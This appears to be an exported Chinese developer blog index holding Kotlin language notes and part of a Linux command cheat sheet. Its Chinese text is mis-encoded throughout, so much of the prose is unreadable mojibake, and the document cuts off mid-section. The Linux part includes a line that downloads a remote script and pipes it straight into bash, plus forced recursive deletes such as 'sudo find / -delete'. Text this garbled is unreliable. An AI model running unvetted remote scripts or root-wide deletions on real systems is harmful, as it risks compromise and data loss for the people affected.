å…³é”®å­—äº†ï¼Œé™æ€æ–¹æ³•çš„å†™æ³•class Controller { private val _items = mutableListOf&lt;String&gt;(&quot;1&quot;,&quot;2&quot;,&quot;4&quot;) val items: List&lt;String&gt; get() = _items.toList() companion object { fun checkType(args:Any?){ when(args){ is String -&gt; println(&quot;This is an String Type&quot;) is Int -&gt; println(&quot;This is Some Integer Number &quot;) else -&gt; println(&quot;i don&#39;t recognize this format doom.....&quot;) } } } } //å¤–éƒ¨è°ƒç”¨ Controller.checkType(10) // -&gt; This is Some Integer Number //åœ¨å¦ä¸€ä¸ªclassä¸­è°ƒç”¨Controller.Companion.checkType(18) //å’Œstaticæ–¹æ³•ä¸€æ ·ï¼Œå¦‚æœæ–¹æ³•æ˜¯privateçš„è¯ï¼Œå¤–éƒ¨ä¹Ÿè®¿é—®ä¸äº† æ‰€ä»¥æ¯”å¦‚è¯´åƒConstantsè¿™æ ·çš„ä¸œè¥¿ï¼Œä¹Ÿè¦ä¸¢åˆ°companion objectä¸­äº† 13. class castval modifiableMap :MutableMap&lt;String,String&gt; = unmodifiableMap as MutableMap&lt;String, String&gt; //ä½¿ç”¨aså…³é”®å­— 14. by lazyå’Œlateinitçš„åŒºåˆ«å‚è€ƒ val myUtil by lazy { MyUtil(parameter1, parameter2) } // ç¬¬ä¸€æ¬¡è°ƒç”¨myUtilçš„æ—¶å€™ä¼šè°ƒç”¨ val instance :HashMap&lt;String,String&gt; by lazy { HashMap&lt;String,String&gt;() } //æ‰€ä»¥çœ‹ä¸Šå»å°±ç‰¹åˆ«é€‚åˆä½œä¸ºinstance //å®˜æ–¹æ¨èçš„å®ç°singletonçš„æ–¹å¼ object Resource { val name = &quot;Name&quot; } lateinit var myUtil: MyUtil // ä½¿ç”¨çš„æ—¶å€™ myUtil = MyUtil(parameter1, parameter2) // è¿™æ˜æ˜¾æ˜¯æŠŠå˜é‡çš„åˆå§‹åŒ–ä¸å®šä¹‰åˆ†ç¦»å¼€äº†ã€‚ æ˜¾ç„¶çš„åŒºåˆ«æ˜¯ä¸€ä¸ªæ˜¯val ä¸€ä¸ªæ˜¯varã€‚ å¦‚æœæ˜¯å€¼å¯ä¿®æ”¹çš„å˜é‡ï¼ˆå³åœ¨ä¹‹åçš„ä½¿ç”¨ä¸­å¯èƒ½è¢«é‡æ–°èµ‹å€¼ï¼‰ï¼Œä½¿ç”¨ lateInit æ¨¡å¼å¦‚æœå˜é‡çš„åˆå§‹åŒ–å–å†³äºå¤–éƒ¨å¯¹è±¡ï¼ˆä¾‹å¦‚éœ€è¦ä¸€äº›å¤–éƒ¨å˜é‡å‚ä¸åˆå§‹åŒ–ï¼‰ï¼Œä½¿ç”¨ lateInit æ¨¡å¼ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œlazy æ¨¡å¼ä¹Ÿå¯è¡Œä½†å¹¶ä¸ç›´æ¥é€‚ç”¨ã€‚å¦‚æœå˜é‡ä»…ä»…åˆå§‹åŒ–ä¸€æ¬¡å¹¶ä¸”å…¨å±€å…±äº«ï¼Œä¸”æ›´å¤šçš„æ˜¯å†…éƒ¨ä½¿ç”¨ï¼ˆä¾èµ–äºç±»å†…éƒ¨çš„å˜é‡ï¼‰ï¼Œè¯·ä½¿ç”¨ lazy æ¨¡å¼ã€‚ä»å®ç°çš„è§’åº¦æ¥çœ‹ï¼Œlateinit æ¨¡å¼ä»ç„¶å¯ç”¨ï¼Œä½† lazy æ¨¡å¼æ›´æœ‰åˆ©äºå°è£…ä½ çš„åˆå§‹åŒ–ä»£ç ã€‚ 15. NPEè¿˜æ˜¯ä¼šæœ‰çš„val files = File(&quot;&quot;).listFiles() println(files.size) // crash val files = File(&quot;&quot;).listFiles() println(files?.size) // è¾“å‡º null ?çš„æ„æ€ç±»ä¼¼äºä¼˜å…ˆåˆ¤ç©º 16. let ,apply ,with,runæ–¹æ³•/** * Calls the specified function [block] with `this` value as its argument and returns its result. */ // letï¼Œå…¶å®å°±æ˜¯ä¸€ä¸ªå®ä¾‹åŒ–çš„å¯¹è±¡ä¸Šæ·»åŠ ä¸€ä¸ªextension method val result =&quot;Hello World&quot;.let { println(it) //è¿™ä¸ªitæ˜¯ä¸€ä¸ªå…³é”®å­— 520 } println(result) è¾“å‡º &quot;Hello World&quot; 520 //è¿™ä¸ªæ—¶å€™çš„resultå°±å·²ç»æ˜¯520äº† // å¦‚æœä¸ä¸ºNullçš„è¯ï¼Œæ‰§è¡Œä¸‹é¢è¿™ä¸€æ®µä»£ç å— val value = ... value?.let { ... // execute this block if not null } applyçš„ç”¨æ³•val name = â€œmyNameâ€.apply { toUpperCase() }print(name) //å‡ºæ¥çš„è¿˜æ˜¯myNameï¼Œä¹Ÿå°±æ˜¯è¯´applyé‡Œé¢çš„ä¸œè¥¿ä¸ä¼šå¯¹å€¼äº§ç”Ÿå½±å“ 17. withå…³é”®å­—ç”¨äºåŒæ—¶è°ƒç”¨ä¸€ä¸ªInstance çš„å¤šä¸ªmethodclass Turtle { fun penDown() fun penUp() fun turn(degrees: Double) fun forward(pixels: Double) } val myTurtle = Turtle() with(myTurtle) { //draw a 100 pix square penDown() for(i in 1..4) { forward(100.0) turn(90.0) } penUp() } // java7 çš„try with resources val stream = Files.newInputStream(Paths.get(&quot;/some/file.txt&quot;)) stream.buffered().reader().use { reader -&gt; println(reader.readText()) } 18. classè¿˜æ˜¯Fileæ–°å»ºä¸€ä¸ªclasså’Œæ–°å»ºä¸€ä¸ªFileæœ‰ä»€ä¹ˆåŒºåˆ«ï¼ŒFileé‡Œé¢å¯ä»¥å†™å¤šä¸ªclassï¼Œæ¯ä¸ªclasséƒ½æ˜¯ç±»ä¼¼äºjavaä¸­static inner classï¼Œäº’ç›¸ä¹‹é—´æ˜¯ä¸èƒ½å¼•ç”¨åˆ°çš„ã€‚å†…éƒ¨ç±»ä¸æ˜¯åƒJavaé‚£æ ·å†™åœ¨é‡Œé¢å°±èƒ½å¼•ç”¨åˆ°å¤–éƒ¨ç±»äº†ï¼Œkotlinå†™åœ¨é‡Œé¢çš„classé»˜è®¤æ˜¯å¼•ç”¨ä¸åˆ°å¤–é¢classçš„fieldå’Œæ–¹æ³•çš„ï¼Œéœ€è¦ç»™å†…éƒ¨classåŠ ä¸Šinnerå…³é”®è¯ã€‚ javaé‡Œé¢å†™ä¹ æƒ¯äº†.classå¯¹è±¡ï¼Œåœ¨kotlinä¸­å¾—è¿™ä¹ˆå†™: retrofit.create(ApiStores.class) //javaå†™æ³• retrofit.create(ApiStores::class.java) // kotlinå†™æ³• initå‡½æ•°å’Œconstructoræ˜¯æœ‰åŒºåˆ«çš„What are the Kotlin class initialisation semantics? .ç®€å•æ¥è¯´ï¼Œinitå‡½æ•° 19. ? extends Tæ€ä¹ˆå†™var lst = ArrayList&lt;Class&gt;()lst.add(Noun_Class::class.java) 20.map å’ŒflatMapçš„åŒºåˆ«// è¿™ä¸ªæ˜¯map /** * Applies the given [transform] function to each element of the original collection * and appends the results to the given [destination]. */ public inline fun &lt;T, R, C : MutableCollection&lt;in R&gt;&gt; Iterable&lt;T&gt;.mapTo(destination: C, transform: (T) -&gt; R): C { for (item in this) destination.add(transform(item)) return destination } //è¿™ä¸ªæ˜¯flatMap /** * Appends all elements yielded from results of [transform] function being invoked on each element of original collection, to the given [destination]. */ public inline fun &lt;T, R, C : MutableCollection&lt;in R&gt;&gt; Iterable&lt;T&gt;.flatMapTo(destination: C, transform: (T) -&gt; Iterable&lt;R&gt;): C { for (element in this) { val list = transform(element) destination.addAll(list) } return destination } The difference is that the map operation produces one output value for each input value, whereas the flatMap operation produces an arbitrary number (zero or more) values for each input value. å°±æ˜¯è¯´mapä¸¢è¿›å»ä¸€ä¸ªè¿”å›ä¸€ä¸ªï¼ŒflatMapä¸¢è¿›å»ä¸€ä¸ªå¯èƒ½è¿”å›å¤šä¸ª classçš„ä¸»æ„é€ å‡½æ•°ä¸­æ˜¯ä¸èƒ½åŒ…å«ä»»ä½•codeé€»è¾‘çš„ stackoverflowinitä»£ç å—ä¸æ˜¯æ„é€ å‡½æ•°ï¼ŒåŒæ—¶ï¼Œinitçš„æ‰§è¡Œæ•ˆæœè¦çœ‹å†™åœ¨å“ªä¸€è¡Œäº†ï¼Œå¦‚æœåœ¨Initä¸­å¼•ç”¨äº†ä¸€ä¸ªpropertityï¼Œè¿™ä¸ªå±æ€§è¦æ˜¯åœ¨Initä¹‹å‰å°±åˆå§‹åŒ–äº†é‚£å€’è¿˜å¥½ï¼Œè¦æ˜¯åœ¨åé¢,é‚£ä¹ˆåœ¨initè°ƒç”¨çš„æ—¶å€™çœ‹åˆ°çš„å°±æ˜¯null.(å…¶å®ç¼–è¾‘å™¨è¿™æ—¶å€™å°±ä¼šè­¦å‘Šçš„) class Person { /*ä¸»æ„é€ */ constructor() { println(&quot;constructor1&quot;) } /*å±æ€§*/ private var gender: Boolean = true /*ä¼´ç”Ÿå¯¹è±¡*/ companion object { val instance: Person by lazy { Person(&quot;yzq&quot;, 26) } /*ä¼´ç”Ÿå¯¹è±¡ä¸­çš„åˆå§‹åŒ–ä»£ç */ init { println(&quot;companion init 1&quot;) } init { println(&quot;companion init 2&quot;) } } /*æ¬¡æ„é€ æ–¹æ³•*/ constructor(name: String, age: Int) : this() { println(&quot;constructor2&quot;) } /*åˆå§‹åŒ–ä»£ç å—*/ init { println(&quot;Person init 2,gender:${gender}&quot;) } /*åˆå§‹åŒ–ä»£ç å—*/ init { println(&quot;Person init 1&quot;) } } åˆå§‹åŒ–çš„æ—¶å€™æ‰“å°ç»“æœ:companion init 1companion init 2Person init 2,gender:truePerson init 1constructor1constructor2è‡ªå·±æ„Ÿå—ä¸‹è¿™ä¸ªé¡ºåº @Insert fun insertAll(vararg users: User) //è¿™ä¸ªvarargç­‰äºjavaé‡Œé¢çš„...å°±æ˜¯ä¸€ä¸ªæ•°ç»„çš„æ„æ€ forEachåœ¨Androidä¸Šå¯èƒ½ä¼šå´©fun test1(){ hashMapOf(&quot;a&quot; to &quot;b&quot;).forEach { t, u -&gt; } } fun test2(){ hashMapOf(&quot;a&quot; to &quot;b&quot;).forEach { (t, u) -&gt; } } test1ä½¿ç”¨çš„æ˜¯java 8çš„BiConsumerï¼Œåœ¨ä½ç‰ˆæœ¬(api 24ä»¥ä¸‹)ä¼šå´©ï¼Œç¬¬äºŒç§ä½¿ç”¨çš„æ˜¯å¸¸è§„çš„Iteratoræ–¹æ³• 21 .inline , crossinlineå’Œnoinlineinlineç­‰æ¶‰åŠé«˜é˜¶å‡½æ•°å…³é”®å­— tbd jconf taiwanä¸Šæœ‰ä¸€ä¸ªå…³äºkotlinå®ç°ç»†èŠ‚çš„æ¼”è®² kotlin å§”æ‰˜å±æ€§ å‚è€ƒ Kotlin in production 10 Kotlin Tricks in 10 ish minutes by Jake Whartonâ€‹ Try Kotlin What can Kotlin do for me? (GDD Europe â€˜17)KotlinConf 2017 - Deep Dive into Coroutines on JVM by Roman Elizarov coroutineåœ¨jvmä¸Šçš„å®ç°åŸç†getting-started-with-coroutines-on-android","tags":[{"name":"kotlin","slug":"kotlin","permalink":"https://haldir65.github.io/tags/kotlin/"}]},{"title":"linuxåŸºæœ¬å‘½ä»¤ä»‹ç»","date":"2017-01-07T15:38:43.000Z","path":"2017/01/07/2017-01-07-Linux-Basic-Commands/","text":"ä¸€äº›å¸¸ç”¨çš„linuxåŸºæœ¬å‘½ä»¤,ä»…ä½œä¸ºå‚è€ƒã€‚ nohup node server.js &gt; /dev/null 2&gt;&amp;1 &amp; é¦–å…ˆæ˜¯è¿æ¥vpsçš„ssh(Secure Shell)å·¥å…·ï¼Œputtyæˆ–è€…xshelléƒ½å¯ä»¥,puttyæ”¹é¢œè‰²æ•™ç¨‹ã€‚ é‡å¯ rebootå…³æœº shutdown -h now #æˆ–è€… halt é€ŸæŸ¥æ‰‹å†Œ æ–‡ä»¶æ“ä½œ Viæ–‡æœ¬ç¼–è¾‘å™¨ bashè„šæœ¬æ€ä¹ˆå†™ ç”¨æˆ·å’Œç”¨æˆ·ç»„çš„é—®é¢˜ æ–‡ä»¶æƒé™ ç®¡é“ ç¡¬ä»¶ç›¸å…³çš„å‘½ä»¤ è½¯ä»¶çš„å®‰è£…ï¼Œå¸è½½ ç½‘ç»œç›‘æ§ æŸ¥çœ‹è¿›ç¨‹ é€šç”¨é…ç½® å‚è€ƒ å¦å¤–ä¸€ç¯‡å…³äºlinuxå‘½ä»¤çš„è¡¥å…… 1. æ–‡ä»¶æ“ä½œå¸¸ç”¨å‘½ä»¤- &gt; cd //è¿›å…¥ç›®å½• - &gt; cd / è¿”å›æ ¹ç›®å½• - &gt; pwd // æ˜¾ç¤ºå½“å‰ç›®å½• (print working directory) - &gt; ls // æ˜¾ç¤ºå½“å‰ç›®å½•ä¸‹å†…å®¹ - &gt; ll = ls -al ## è¿™æ—¶å€™å‘ç°æœ‰äº›æ–‡ä»¶ååé¢è·Ÿç€ä¸€ä¸ªæ˜Ÿå·ï¼Œè¿™è¯´æ˜è¿™ä¸ªæ–‡ä»¶æ˜¯å¯æ‰§è¡Œçš„ # ls -halt is for human readable, show hidden, print details, sort by date ls â€“l â€“R(æˆ–-lR) src &gt; list.txt ##åˆ—å‡ºæ–‡ä»¶åˆ—è¡¨ cd - //å›åˆ°ä½ åˆšæ‰çš„ç›®å½• ll -trh ## æŒ‰ç…§modify timeå€’åºæ’åˆ—ï¼ˆ-t sort by modification timeï¼Œ-r reverse order while sortingï¼‰ - &gt; mkdir //æ–°å»ºç›®å½• - &gt; rmdir //åˆ é™¤ç›®å½•,å¦‚æœç›®å½•ä¸ä¸ºç©ºï¼Œ - &gt;ä½¿ç”¨ rm -r //é€’å½’åˆ é™¤ - &gt; rm -rf //å¼ºåˆ¶åˆ é™¤ æ–‡ä»¶åä¸€èˆ¬ä¸æ”¯æŒç©ºæ ¼ï¼Œå¦‚æœçœŸæœ‰çš„è¯å¾—ç”¨å•å¼•å·æ‹¬èµ·æ¥ï¼Œåƒè¿™æ ·: -&gt; rm -f &#39;my file&#39; -&gt; mv a.mp4 b.mp4 //mvè™½ç„¶æ˜¯ç§»åŠ¨ï¼ˆWindowsä¸­çš„å‰ªåˆ‡ï¼‰æ“ä½œï¼Œä½†è¿™ç§æƒ…å†µä¸‹å°±ç­‰åŒäºé‡å‘½åäº†ï¼Œäº²æµ‹æœ‰æ•ˆ # é‡å‘½å renameæ˜¯å®é™…æ„ä¹‰ä¸Šçš„é‡å‘½åå‘½ä»¤ï¼Œä½†renameæ¥å—ä¸‰ä¸ªå‚æ•° - &gt; touch filename //åˆ›å»ºæ–‡ä»¶ï¼Œåç¼€åœ¨linuxä¸‹æ²¡æ„ä¹‰ å¦å¤–,touch å‘½ä»¤ä¸»è¦æ˜¯ç”¨æ¥æ”¹æ–‡ä»¶çš„æ—¶é—´æˆ³çš„ - &gt; touch -t 201707081238.34 file.txt //æŠŠè¿™ä¸ªæ–‡ä»¶çš„æ—¶é—´æˆ³æ”¹æˆ2017å¹´XXXã€‚ã€‚ã€‚ å¤åˆ¶ç²˜è´´ï¼š - &gt; cp a b //æŠŠaå¤åˆ¶ä¸€ä»½ï¼Œå‘½åä¸ºb - &gt; cp d1 d2 // è¿™æ ·æ˜¯ä¸è¡Œçš„ï¼Œå¤åˆ¶ç›®å½•éœ€è¦åŠ ä¸Š-r ï¼Œå³ - &gt; cp -r d1 d2 ç§»åŠ¨(å·¦è¾¹æ˜¯è¢«ç§»åŠ¨çš„æ–‡ä»¶æˆ–ç›®å½•ï¼Œå³è¾¹æ˜¯ç›®æ ‡è·¯å¾„)ï¼š - &gt; mv d1 / æŠŠd1ç§»åŠ¨åˆ°ç›¸å¯¹è·¯å¾„ï¼Œä¹Ÿå°±æ˜¯æ ¹ç›®å½•ä¸‹ - &gt; mv d1 ../æŠŠd1å¾€ä¸Šç§»åŠ¨ä¸€å±‚ - &gt; mv d1 ../../ é‡å®šå‘é‡å®šå‘è¾“å‡º &gt; ls &gt; lsoutput.txt #ç”¨äºå°†è¾“å‡ºçš„ç»“æœå†™å…¥ä¸€ä¸ªæ–°çš„æ–‡æœ¬æ–‡ä»¶ä¸­ cat &gt; newfile // æ‰€ä»¥é‡å®šå‘ä¹Ÿèƒ½ç”¨äºåˆ›å»ºæ–°çš„æ–‡ä»¶ echo &#39;hey man&#39; # ç±»ä¼¼äºprint echo &#39;hello&#39; &gt; log.txt #æŠŠè¿™å¥è¯å†™å…¥åˆ°æ–‡æœ¬ä¸­ ï¼Œè¦†ç›–å…¶åŸæœ‰å†…å®¹ printf &quot;hello world\\n&quot; //linuxé‡Œé¢è¿™æ ·ä¹Ÿæ˜¯å¯ä»¥è¾“å‡ºçš„ï¼Œå‡ ä¹å°±å’Œcè¯­è¨€è¯­æ³•ä¸€è‡´äº† echo $((2+2)) ##shellé‡Œé¢ä¹Ÿæ˜¯èƒ½å¤Ÿè¿›è¡ŒåŠ å‡ä¹˜é™¤çš„ï¼Œéœ€è¦ä¸¤ä¸ªparentheses.å½“ç„¶è¿™é‡Œåªèƒ½å¤„ç†å°æ•°,2.3ç›´æ¥å‘ä¸Šå˜æˆ3 &gt;&gt; è¡¨ç¤ºè¿½åŠ ï¼Œä¸è¦†ç›–,append ###é‡å®šå‘è¾“å…¥ &lt; wall &lt; aa.txt # wallæ˜¯å‘æ‰€æœ‰ç”¨æˆ·å‘å¹¿æ’­ï¼Œ å³ä»aa.txtä¸­è¯»å–å†…å®¹ï¼Œç„¶åå¹¿æ’­å‘å‡ºå» bash &lt;(curl -L -s https://install.direct/go.sh) // æ¯”å¦‚è¯´éšä¾¿ä»ç½‘ä¸Šä¸‹ä¸€ä¸ªshæ–‡ä»¶ä¸‹æ¥ï¼Œç„¶åç”¨bashæ‰§è¡Œ #serviceå‘½ä»¤ service XXX start/stop/status #åŸç†æ˜¯å°†è¿™äº›ç¨‹åºæ³¨å†Œæˆä¸ºç³»ç»ŸæœåŠ¡ï¼Œè¿™æ ·è°ƒç”¨è¿™äº›ç¨‹åºçš„æ—¶å€™å°±ä¸éœ€è¦å†™ä¸€å¤§å †ç»å¯¹è·¯å¾„äº†ï¼Œå…·ä½“ç”¨æ³•helpå·²ç»å¾ˆè¯¦ç»†äº†ã€‚ zip â€“q â€“r video.zip /home/video zip â€“q â€“r video.zip . # .ä»£è¡¨å½“å‰ç›®å½• å»ºè®®åŠ ä¸Š-vï¼Œä¸ç„¶ç­‰å¾ˆä¹… 2. Viæ–‡æœ¬ç¼–è¾‘å™¨- &gt; vi 3.txt // å¦‚æœæœ‰åˆ™ç¼–è¾‘ï¼Œæ²¡æœ‰åˆ™ç›´æ¥åˆ›å»º ## è·³åˆ°æ–‡ä»¶å¼€å¤´å¤„ [[ ##è·³åˆ°æ–‡ä»¶ç»“å°¾å¤„ ]] ##Viåˆ†ä¸ºå‘½ä»¤æ¨¡å¼å’Œç¼–è¾‘æ¨¡å¼ï¼Œä¸€è¿›æ¥æ˜¯å‘½ä»¤æ¨¡å¼ï¼Œè¾“å…¥&#39;a&#39;è¿›å…¥ç¼–è¾‘æ¨¡å¼ ##åˆ‡æ¢å›å‘½ä»¤æ¨¡å¼æŒ‰&#39;esc&#39; ## å‘½ä»¤æ¨¡å¼ä¸‹ :w è¡¨ç¤ºå­˜ç›˜ - :q é€€å‡º - :wq ä¿å­˜å¹¶é€€å‡º - :q! ä¸ä¿å­˜é€€å‡ºï¼ˆæ— å†…å®¹å˜åŒ–ï¼‰ yyã€Y å¤åˆ¶å½“å‰å…‰æ ‡æ‰€åœ¨çš„è¡Œ nyy å¤åˆ¶å½“å‰å…‰æ ‡æ‰€åœ¨å¤„ä»¥åŠä»¥ä¸‹çš„nè¡Œ dd ï¼šå‰ªåˆ‡å½“å‰å…‰æ ‡æ‰€åœ¨å¤„çš„è¡Œ ndd ï¼šå‰ªåˆ‡å½“å‰å…‰æ ‡æ‰€åœ¨å¤„åŠä»¥ä¸‹çš„nè¡Œ pï¼šåœ¨å½“å‰å…‰æ ‡å¤„ä¸‹é¢ç²˜è´´å†…å®¹ã€‚ Pï¼šåœ¨å½“å‰å…‰æ ‡å¤„ä¸Šé¢ç²˜è´´å†…å®¹ã€‚ åœ¨ç¼–è¾‘æ¨¡å¼ä¸‹,è¾“å…¥ â€˜ddâ€™åˆ é™¤ä¸€è¡Œ ï¼Œè¾“å…¥â€™dwâ€™åˆ é™¤ä¸€ä¸ªè¯è¾“å…¥â€™oâ€™æ’å…¥ä¸€è¡Œã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ - &gt; more filename//æŸ¥çœ‹æ–‡ä»¶å†…å®¹(ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹) - &gt; less filename// ä¹Ÿæ˜¯æŸ¥çœ‹(less ä¸ more ç±»ä¼¼ï¼Œä½†æ˜¯æ¯” more æ›´å¥½çš„æ˜¯ï¼Œä»–å¯ä»¥[pg dn][pg up]ç¿»é¡µï¼) - &gt; cat filename //æ­£åºæŸ¥çœ‹æ–‡ä»¶å†…å®¹ - &gt; tac filename //é€†åºæŸ¥çœ‹æ–‡ä»¶å†…å®¹ - &gt; nlï¼š æ˜¾ç¤ºçš„æ—¶å€™ï¼Œéšä¾¿è¾“å‡ºè¡Œå·ï¼ - &gt; moreï¼š ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹ - &gt; less ä¸ more ç±»ä¼¼ï¼Œä½†æ˜¯æ¯” more æ›´å¥½çš„æ˜¯ï¼Œä»–å¯ä»¥[pg dn][pg up]ç¿»é¡µï¼å¯¹lessæ˜¾ç¤ºå‡ºçš„å†…å®¹ä¸­å¯ä»¥ä½¿ç”¨ /&#39;å­—ç¬¦&#39; è¾“å…¥éœ€è¦æŸ¥æ‰¾çš„å­—ç¬¦æˆ–è€…å­—ç¬¦ä¸²å¹¶é«˜äº®æ˜¾ç¤ºï¼Œè€Œmore ä¸å…·å¤‡(äº²æµ‹å¾ˆå¥½ç”¨) - &gt; less +F ##å’Œtail -få·®ä¸å¤šï¼Œè¿™ä¸ªâ•è¦æœ‰çš„ï¼Œæ­é…ctrl+c ,shift-f ,q - &gt; headï¼š æŸ¥çœ‹å¤´å‡ è¡Œ - &gt; tailï¼š æŸ¥çœ‹å°¾å‡ è¡Œ - &gt; head - 3 filename //åªæŸ¥çœ‹æ–‡ä»¶å‰é¢ä¸‰è¡Œ - &gt; tail - 3 filename //åªæŸ¥çœ‹å€’æ•°åä¸‰è¡Œ - &gt; tail -n 3 filename //å’Œä¸Šé¢æ˜¯ä¸€æ ·çš„ çœ‹binaryFileä¸èƒ½ç”¨cat how to view a file (text or binary) in binary format xxd -b fileName //binary xxd file // hex format od -xc //binary format hd file // symboloc link to hexdump - &gt; odï¼š é€šå¸¸ä½¿ç”¨odå‘½ä»¤æŸ¥çœ‹ç‰¹æ®Šæ ¼å¼çš„æ–‡ä»¶å†…å®¹ã€‚é€šè¿‡æŒ‡å®šè¯¥å‘½ä»¤çš„ä¸åŒé€‰é¡¹å¯ä»¥ä»¥åè¿›åˆ¶ã€å…«è¿›åˆ¶ã€åå…­è¿›åˆ¶å’ŒASCIIç æ¥æ˜¾ç¤ºæ–‡ä»¶ã€‚ d åè¿›åˆ¶ o å…«è¿›åˆ¶ï¼ˆç³»ç»Ÿé»˜è®¤å€¼ï¼‰ x åå…­è¿›åˆ¶ n ä¸æ‰“å°ä½ç§»å€¼ od -c filename(ä»¥å­—ç¬¦æ–¹å¼æ˜¾ç¤º) od -Ax -tcx4 filename(ä»¥åå…­è¿›åˆ¶å’Œå­—ç¬¦åŒæ—¶æ˜¾ç¤º) tailè¿˜æœ‰ä¸€ä¸ªå¥½å¤„ï¼Œå¯ä»¥å®æ—¶æŸ¥çœ‹æ–‡ä»¶å†…å®¹ï¼Œæ¯”å¦‚æ–‡ä»¶æ­£åœ¨æ›´æ–°ï¼Œå¯ä»¥å®æ—¶æŸ¥çœ‹æœ€æ–°çš„æ—¥å¿— tail -f /var/log/messages äº²æµ‹ï¼Œä¸€ä¸ª10MBçš„logæ–‡ä»¶ï¼Œå°±è¿™ä¹ˆcatçš„è¯ï¼Œä¼šæŠŠputtyææ­» æ‰€ä»¥åå°å¼€å‘å°±å–œæ¬¢è¿™ä¹ˆå¹²: tailä¸€ä¸ªæ—¥å¿—ï¼Œç‹‚æŒ‰å›è½¦é”®ï¼Œç„¶åç”¨å®¢æˆ·ç«¯è®¿é—®æŸä¸ªurlï¼Œçœ‹ä¸‹æœ‰æ²¡æœ‰æŠ¥é”™ã€‚ æ›´å¤šå‘½ä»¤å¦‚ find ã€ whereis ã€ Li(Link)æŸ¥æ‰¾ï¼š find / -name filename //åœ¨æ ¹ç›®å½•ä¸‹æŸ¥æ‰¾æ–‡ä»¶ find /etc -name filename //åœ¨etcç›®å½•ä¸‹æŸ¥æ‰¾æ–‡ä»¶ ## åœ¨å½“å‰ç›®å½•ä¸‹æ‰¾æ‰€æœ‰ç±»å‹ä¸ºç›®å½•çš„æ–‡ä»¶ï¼Œæœ€å¤šå¾€ä¸‹æ‰¾ä¸‰å±‚ find . -maxdepth 3 -type d ## ä¸‹é¢è¿™ä¸ªå°±æ˜¯æ‰¾åˆ°äº†å¹¶ä¸”åˆ é™¤ sudo find / -name .DS_Store -delete sudo find / -name &quot;.DS_Store&quot; -exec rm {} \\; grep stringtofind filename //åœ¨æŒ‡å®šçš„æ–‡æœ¬æ–‡ä»¶ä¸­æŸ¥æ‰¾æŒ‡å®šçš„å­—ç¬¦ä¸² whereis ls //æŸ¥çœ‹lså‘½ä»¤æ‰€æ‰§è¡Œçš„æ˜¯å“ªä¸ªæ–‡ä»¶åŠå…¶ä½ç½®(æŸ¥çœ‹ç³»ç»Ÿæ–‡ä»¶æ‰€åœ¨è·¯å¾„) å¿«æ·é”®sudo !! - re-run previous command with â€˜sudoâ€™ prepended ##æ•²å‘½ä»¤å¿˜è®°åŠ sudoäº†ï¼Œç›´æ¥sudo!!ï¼ŒæŠŠä¸Šä¸€ä¸ªå‘½ä»¤åŠ ä¸Šsudoæ‰§è¡Œä¸€éctrl-k, ctrl-u, ctrl-w, ctrl-y - cutting and pasting text in the command lineuse â€˜less +Fâ€™ to view logfiles, instead of â€˜tailâ€™ (ctrl-c, shift-f, q to quit)ctrl-x-e - continue editing your current shell line in a text editor (uses $EDITOR)alt-. - paste previous commandâ€™s argument (useful for running multiple commands on the same resource) ctrl + r æŸ¥æ‰¾å†å²å‘½ä»¤ 4. ç”¨æˆ·å’Œç”¨æˆ·ç»„çš„é—®é¢˜id userName // æŸ¥çœ‹å½“å‰ç”¨æˆ·çš„ä¿¡æ¯ï¼Œæ¯”å¦‚æ˜¯ä¸æ˜¯sudoä¹‹ç±»çš„ useradd user //æ·»åŠ ç”¨æˆ·ï¼Œ(-g æŒ‡å®šç”¨æˆ·æ‰€åœ¨ç”¨æˆ·ç»„)/homeç›®å½•ä¸‹ä¼šå¤šä¸€ä¸ªuserçš„ç›®å½•ï¼Œä½œä¸ºè¯¥ç”¨æˆ·çš„ä¸»ç›®å½• sudo su - userName // ä»rootç›´æ¥åˆ‡åˆ°userNameï¼Œå…·æœ‰sudoæƒé™ ç»™ä¸€ä¸ªuserç®¡ç†å‘˜æƒé™: usermod -aG sudo userName passwd user //è®¾ç½®userçš„å¯†ç ï¼Œä¼šæç¤ºè¾“å…¥å¯†ç ï¼Œå¯†ç ä¸ä¼šæ˜¾ç¤ºåœ¨çª—å£ä¸­ cd /etc &gt;&gt;&gt; more passwd ï¼Œè¿™é‡Œé¢ä¼šæ˜¾ç¤ºæ‰€æœ‰çš„ç”¨æˆ· more group ,æ˜¾ç¤ºç”¨æˆ·ç»„çš„ä¿¡æ¯ groupadd groupname //æ·»åŠ ä¸€ä¸ªç”¨æˆ·ç»„ //åˆ é™¤ç”¨æˆ· userdel user //åˆ é™¤ä¸€ä¸ªç”¨æˆ· è¿™ä¹ˆåˆ é™¤è¿˜æ²¡åˆ å¹²å‡€ï¼Œéœ€è¦æŠŠ/home/usernameåˆ æ‰ è¿˜éœ€è¦åˆ é™¤è¯¥ç”¨æˆ·çš„ä¸»ç›®å½•(rm -rf user) é‡å¯æœºå™¨ï¼Œç™»å½•é¡µé¢é€‰æ‹©æ–°ç”¨æˆ·å³å¯å®Œæˆç”¨æˆ·åˆ‡æ¢ æˆ–è€…ä½¿ç”¨ su testuser åˆ‡æ¢åˆ°testuserèº«ä»½ exitå°±å›åˆ°rootç”¨æˆ·çš„èº«ä»½ ç¦æ­¢æŸä¸ªç”¨æˆ·ç™»å½•çš„åŸç† åœ¨/etc/shadowä¸­å­˜å‚¨äº†æ¯ä¸ªç”¨æˆ·çš„å¯†ç çš„hashå€¼ï¼Œåœ¨å‰é¢æœ‰!çš„éƒ½æ˜¯ä¸èƒ½ç™»å½•çš„ åŠ !çš„æ–¹æ³•: usermod -L username è§£é”çš„æ–¹æ³•: passwd username /etc/groupå­˜å‚¨äº†ç”¨æˆ·ç»„çš„ä¿¡æ¯ /etc/shadowå­˜å‚¨äº†å¯†ç çš„hashå€¼ /etc/passwdå­˜å‚¨äº†ç³»ç»Ÿä¸­æ‰€æœ‰ç”¨æˆ·çš„ä¸»ç›®å½•è·¯å¾„ï¼Œä¾‹å¦‚/home/username æ–°ç”¨æˆ·ç™»å½•æ—¶ï¼Œé»˜è®¤çš„æ˜¯è¯¥ç”¨æˆ·çš„ä¸»ç›®å½• ~/ 5. 